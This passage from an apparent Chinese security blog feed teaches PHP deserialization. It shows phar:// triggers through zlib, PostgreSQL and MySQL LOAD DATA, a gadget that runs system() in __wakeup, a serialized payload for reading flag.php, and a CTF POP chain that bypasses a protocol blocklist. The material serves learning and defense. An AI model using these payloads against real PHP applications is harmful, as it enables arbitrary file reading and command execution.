&#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">&#x27;compress.zlib://phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/16/QlPku3bO9DzyNmG.png"></p><p>这意味着我们能在 <code>compress.zlib://</code> 后面添加我们的 phar 语句，也就是说如果禁止了开头使用 <code>phar://</code> 我们就能用这种方法绕过。</p><h3 id="PDO-postgresql"><a href="#PDO-postgresql" class="headerlink" title="PDO::postgresql"></a><a href="https://github.com/php/php-src/blob/master/ext/pdo_pgsql/pgsql_driver.c#L674">PDO::postgresql</a></h3><p><img src="https://i.loli.net/2020/03/16/C3KAn8ipRueOkm2.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>);</span><br></pre></td></tr></table></figure><p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a><a href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c#L329">libxml</a></h3><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/image-20200316133930297.png"></p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><a href="https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L50">MySQL</a></h3><p><img src="https://i.loli.net/2020/03/16/fnAFdDHWZi3ljRh.png"></p><p>我们注意到，<code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code>. 让我们测试一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $output = <span class="string">&#x27;okok&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;$output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;meimima123&#x27;</span>, <span class="string">&#x27;dvwa&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://phar.phar/test.txt\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>再配置一下<code>mysql.ini</code>的<code>mysqld</code>。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这个例子在<a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>中也提到了，更加详细。</p><p>以上基本上就是phar的影响范围了，大家可以看到，影响非常的广，几乎所有用到wrapper封装的函数都可能存在这个问题。那么如何防御呢？</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol><h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><p>本文是在学习各位大佬对phar与反序列化的分析后，进行的总结，这里感谢@ZSX, K0rz3n, Smi1e, Mochazz, seaii等等大佬的文章，读完都感觉获益良多。这篇总结基本上也就是把各位大佬的话总结复述了一遍，很多地方甚至是直接引用的，如有侵权，烦请联系。</p><p>考完研后，感觉一年和各位大佬的差距进一步拉大了，但是花了好几天复现和学习phar与php反序列化问题，随着一步一步的深入（由浅入深，由自己会的到自己不会的内容），真的很有获得感和满足感。希望以后我也能自己写出这样一篇篇出色的文章，做一个个这样深入的分析。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a> 2018/8, seaii</p></li><li><p><a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p></li><li><p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar">PHP反序列化入门之phar</a> 2019/02, Mochazz(七月火)</p></li><li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解PHP反序列化漏洞</a> 2018/11 K0rz3n</p></li><li><p><a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 2018/10 zsx</p></li><li><p><a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">php反序列化攻击拓展</a>  , Smi1e</p></li><li><p><a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前学校的seaii表哥在404发了一篇paper——&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;利用 </summary>
      
    
    
    
    <category term="Web安全" scheme="http://v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://v0w.top/tags/php/"/>
    
    <category term="反序列化" scheme="http://v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化与POP链</title>
    <link href="http://v0w.top/2020/03/05/unsearise-POP/"/>
    <id>http://v0w.top/2020/03/05/unsearise-POP/</id>
    <published>2020-03-04T16:00:00.000Z</published>
    <updated>2020-11-20T09:55:43.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化与POP链"><a href="#php反序列化与POP链" class="headerlink" title="php反序列化与POP链"></a>php反序列化与POP链</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h2><p>php反序列化是很久之前就接触的漏洞，但是一直都没有深入的学习，只是知道一个大概，POP链的构造也不是很熟练，于是今天总结一下。本文将详细介绍<strong>php反序列化原理，为什么有的时候序列的payload无效，POP链的构造以及Session的反序列化</strong>下一节会具体学习如何利用phar协议扩展php反序列化的攻击面。</p><h2 id="0x01-反序列化基本知识"><a href="#0x01-反序列化基本知识" class="headerlink" title="0x01 反序列化基本知识"></a>0x01 反序列化基本知识</h2><h3 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h3><p><strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</p><p><strong>反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。</p><h3 id="1-2-php魔术方法"><a href="#1-2-php魔术方法" class="headerlink" title="1.2 php魔术方法"></a>1.2 php魔术方法</h3><p>PHP提供了许多“魔术”方法，这些方法由两个下划线前缀（__）标识。它们充当拦截器，在满足某些条件时会自动调用它们。 魔术方法提供了一些极其有用的功能。</p><p>常见的魔术方法有：</p><ol><li><p><code>__contruct()</code>  当一个对象创建时被调用</p></li><li><p><code>__destruct()</code>  当一个对象销毁前被调用</p></li><li><p><code>__sleep()</code>  在对象被序列化前被调用</p></li><li><p><code>__wakeup</code>    将在反序列化之后立即被调用</p></li><li><p><code>__toString</code> 当一个对象被当做字符串使用时被调用</p></li><li><p><code>__get()</code>,<code>__set()</code>   当调用或设置一个类及其父类方法中<strong>未定义的属性</strong>时</p></li><li><p><code>__invoke()</code>  调用函数的方式调用一个对象时的回应方法</p></li><li><p><code>__call</code> 和 <code>__callStatic</code>前者是调用类<strong>不存在的方法</strong>时执行，而后者是调用类不存在的静态方式方法时执行。</p></li></ol><p>通过调试下面这个程序，会对魔术方法的调用有更直观的认识，强烈建议单步调试一遍。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n__destruct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$property, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="string">&quot;\n__set() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __construct()</span></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __toSting()</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __sleep()</span></span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//调用 __wakeup()</span></span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="comment">//不存在这个bbbb属性，调用 __get()</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;bbbb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name是私有变量，不允许修改，调用 __set()</span></span><br><span class="line">$a-&gt;name = <span class="string">&quot;pro&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;name;</span><br><span class="line"><span class="comment">//将对象作为函数，调用 __invoke()</span></span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序结束，调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span></span><br></pre></td></tr></table></figure><h3 id="1-3-序列化后的字符串形式"><a href="#1-3-序列化后的字符串形式" class="headerlink" title="1.3 序列化后的字符串形式"></a>1.3 序列化后的字符串形式</h3><p>一个序列化的字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O代表这是一个对象，4代表对象名称的长度，2代表成员个数。</span><br><span class="line">大括号中分别是：属性名类型、长度、名称;值类型、长度、值。</span><br></pre></td></tr></table></figure><p>另外，<strong>注意到不同权限的属性，序列化之后的字符串存在区别：</strong></p><p><strong>public</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O: 对象 4（类的名字长度为4）&quot;Test&quot;类名称</span></span><br><span class="line"><span class="comment">//2 （对象含有的属性数量）</span></span><br><span class="line"><span class="comment">//s:属性是字符串  4 是属性名称的长度 &quot;test&quot; 属性名称 s:2:&quot;ok&quot; 属性是字符串，长度2，值为&quot;ok&quot; </span></span><br><span class="line"><span class="comment">// s:另一个属性是字符串，3长度，var，属性值，N NULL另一个属性初始值为空  </span></span><br></pre></td></tr></table></figure><p>可以看到，public的属性，序列化后的值就是属性的名称和对应的值</p><p><img src="https://i.loli.net/2020/03/10/R5nuKyM4hV6Uvis.png"></p><p><strong>private</strong></p><p>换成private权限，属性在序列化后也会出现区别，用010editor容易看出。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br></pre></td></tr></table></figure><p>属性名变成了<code>%00Test%00test</code>和<code>%00Test%00var</code></p><p>也就是<code>%00类名%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/jOGdk6VZvAqQPcN.png"></p><p><strong>protected</strong></p><p>换成protected, 属性序列化之后又变了，属性名变成了<code>%00*%00test</code>和<code>%00*%00var</code></p><p>也就是<code>%00*%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/whWsyA3YTH7JGtU.png"></p><p>注意到这些对构造序列化的字符串很关键，当我们直接将<code>private protected</code>的属性进行序列化，得到的序列化字符串的payload将无效，因为<code>0x00</code>的缘故。但是通过<code>urlencode</code>就可以避免这种当时可能会看起来莫名其妙的”bug“（个人经验==、）。</p><h2 id="0x02-php反序列化漏洞"><a href="#0x02-php反序列化漏洞" class="headerlink" title="0x02 php反序列化漏洞"></a>0x02 php反序列化漏洞</h2><p>反序列化本身不是漏洞，但是如果类的某些属性可控，那么在反序列的过程中就会自动的执行魔术方法，从而导致安全问题。</p><p>所以，通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><p>下面举一个简单的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">&#x27;demo.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source($filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>上面的代码是接收一个参数<code>a</code>，然后将其反序列化，反序列化后，会调用<code>__wakeup()</code>方法。如果一切正常的话，这个方法是显示一下<code>demo.php</code>文件的源代码。但是参数<code>a</code>是可控的，也就是说对象<code>a</code>的属性是可控的。于是我们可以伪造一个<code>filename</code>来构造对象。</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> popdemo();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($p));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/09/elb4YCrgB9oQcyn.png"></p><p>可以看到，当我们对象参数可控时，可以伪造对象的一些属性，从而实现任意文件读取等操作。</p><p>正如，之前所说， 如果我们没有<code>urlencode</code>，就会得到一个无效的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;popdemo&quot;:1:&#123;s:17:</span><br><span class="line">0x00之后会截断</span><br><span class="line"></span><br><span class="line">这样是可以的：</span><br><span class="line">a&#x3D;O:7:&quot;popdemo&quot;:1:&#123;s:17:&quot;%00popdemo%00filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/rOns25ZBmA1ueMw.png"></p><h2 id="0x03-POP链的构造"><a href="#0x03-POP链的构造" class="headerlink" title="0x03 POP链的构造"></a>0x03 POP链的构造</h2><h3 id="2-1-什么是POP链"><a href="#2-1-什么是POP链" class="headerlink" title="2.1 什么是POP链"></a>2.1 什么是POP链</h3><blockquote><p>玩过 pwn 的同学应该对 ROP 并不陌生，ROP 的全称是面向返回编程(Return-Oriented Programing),ROP 链构造中是寻找<strong>当前系统环境中</strong>或者<strong>内存环境里已经存在的</strong>、具有固定地址且带有返回操作的指令集,将这些<strong>本来无害的片段</strong>拼接起来，形成一个连续的层层递进的调用链，最终达到我们的执行 libc 中函数或者是 systemcall 的目的</p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0X04-POP-%E9%93%BE%E7%9A%84%E4%BB%8B%E7%BB%8D">来自K0rz3n大佬</a></p></blockquote><p>我的理解是：构造一个完整的调用链，该调用链与原来代码的调用链一致，不过部分属性被我们所控制，从而达到攻击目的。构造的这条链就是POP链。</p><h3 id="2-2-用一个实例说明如何构造POP链"><a href="#2-2-用一个实例说明如何构造POP链" class="headerlink" title="2.2 用一个实例说明如何构造POP链"></a>2.2 用一个实例说明如何构造POP链</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>先看读文件的函数在哪：<code>Read.file_get</code>里面有一个<code>file_get_contents</code>    <code>Show._show()</code>中有一个<code>highlight_file</code></li><li>我们可控的是<code>hello</code>参数，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有<code>Show类</code>中存在该方法，但是注意到在<code>Show.__wakeup()</code>中存在一个正则匹配，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用<code>Show.__toString()</code>方法。</li><li>定位到<code>Show.__toString()</code>，可以将<code>source</code>序列化为Show类的对象，就会调用<code>__toString</code>方法。<code>__toString</code>又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个<code>source</code>不存在的话，就会执行<code>__get()</code>方法。</li><li><code>__get()</code>魔术方法会调用一个<code>$p变量</code>，这个也是可控的，然后会将p当做函数调用，此时触发了<code>Read.__invoke()</code>魔术方法</li><li><code>__invoke魔术方法</code>会触发<code>file_get()函数</code>,进而<code>base64_encode(file_get_contents($value))</code>最终达到读文件的目的。</li></ol><p>这样一条完整的链就分析完了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; Show._show -&gt; Show.__toString -&gt; (不存在属性)Test.__get() -&gt; 